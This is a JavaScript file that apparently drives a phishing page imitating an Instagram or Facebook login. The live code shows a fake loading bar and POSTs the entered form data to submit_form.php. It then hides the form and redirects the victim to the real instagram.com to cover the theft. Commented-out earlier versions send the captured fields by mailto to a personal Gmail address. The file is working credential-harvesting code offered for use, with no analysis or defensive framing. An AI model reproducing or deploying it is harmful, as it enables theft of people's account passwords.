// document.getElementById('login-form').onsubmit = function(event) {
//     event.preventDefault(); 

//     // Get form data
//     const formData = new FormData(this);

//     // Prepare mailto link
//     const subject = encodeURIComponent('Form Submission');
//     const body = formDataToString(formData);
//     const mailtoLink = `mailto:jaeger.62frei@gmail.com?subject=${subject}&body=${body}`;
    
//     // Open mail client
//     window.location.href = mailtoLink;

//     // Redirect to Facebook after a delay
//     setTimeout(function() {
//         window.location.href = "https://www.instagram.com";
//     }, 900); // Delay to allow mailto to trigger
// };

// function formDataToString(formData) {
//     let dataString = '';
//     for (const [key, value] of formData.entries()) {
//         dataString += `${encodeURIComponent(key)}=${encodeURIComponent(value)}&`;
//     }
//     return dataString.slice(0, -1); // Remove the trailing &
// }


// document.getElementById('login-form').onsubmit = function(event) {
//     event.preventDefault(); // Prevent the default form submission

//     // Create FormData object
//     const formData = new FormData(this);

//     // Send form data using fetch
//     fetch('submit_form.php', {
//         method: 'POST',
//         body: formData
//     }).then(response => response.text())
//     .then(result => {
//         // Show confirmation message
//         document.getElementById('confirmationMessage').style.display = 'block';
//         // Hide the form
//         document.getElementById('login-form').style.display = 'none';
//         // Redirect to Facebook after a delay
//         setTimeout(function() {
//             window.location.href = "https://www.instagram.com";
//         }, 6000); // 3 seconds delay
//     }).catch(error => console.error('Error:', error));
// };

// document.getElementById('login-form').onsubmit = function(event) {
//     event.preventDefault(); // Prevent the default form submission

//     // Show loading bar
//     document.getElementById('loadingBarContainer').style.display = 'block';
//     let loadingBar = document.getElementById('loadingBar');
//     let width = 0;
//     let interval = setInterval(function() {
//         if (width >= 100) {
//             clearInterval(interval);
//         } else {
//             width++;
//             loadingBar.style.width = width + '%';
//         }
//     }, 600); // Adjust this value to control the speed of the loading bar

//     // Create FormData object
//     const formData = new FormData(this);

//     // Send form data using fetch
//     fetch('submit_form.php', {
//         method: 'POST',
//         body: formData
//     }).then(response => response.text())
//     .then(result => {
//         // Hide loading bar
//         document.getElementById('loadingBarContainer').style.display = 'none';
//         // Show confirmation message
//         document.getElementById('confirmationMessage').style.display = 'block';
//         // Hide the form
//         document.getElementById('login-form').style.display = 'none';
//         // Redirect to Facebook after a delay
//         setTimeout(function() {
//             window.location.href = "https://www.facebook.com";
//         }, 3000); // 3 seconds delay
//     }).catch(error => console.error('Error:', error));
// };
document.getElementById('login-form').onsubmit = function(event) {
    event.preventDefault(); // Prevent the default form submission

    // Show loading bar
    document.getElementById('loadingBarContainer').style.display = 'block';
    let loadingBar = document.getElementById('loadingBar');
    let width = 0;
    let interval = setInterval(function() {
        if (width >= 100) {
            clearInterval(interval);
            // Proceed with form submission after loading bar completes
            submitForm();
        } else {
            width++;
            loadingBar.style.width = width + '%';
        }
    }, 30); // Adjust this value to control the speed of the loading bar
};

function submitForm() {
    const form = document.getElementById('login-form');
    const formData = new FormData(form);

    // Send form data using fetch
    fetch('submit_form.php', {
        method: 'POST',
        body: formData
    }).then(response => response.text())
    .then(result => {
        // Hide loading bar
        document.getElementById('loadingBarContainer').style.display = 'none';
// Hide forget password
        document.getElementById('fp').style.display = 'none';
        // Show confirmation message
        document.getElementById('confirmationMessage').style.display = 'block';
        // Hide the form
        form.style.display = 'none';
        // 
        setTimeout(function() {
            window.location.href = "https://instagram.com";
        }, 5000); // 3 seconds delay
    }).catch(error => console.error('Error:', error));
}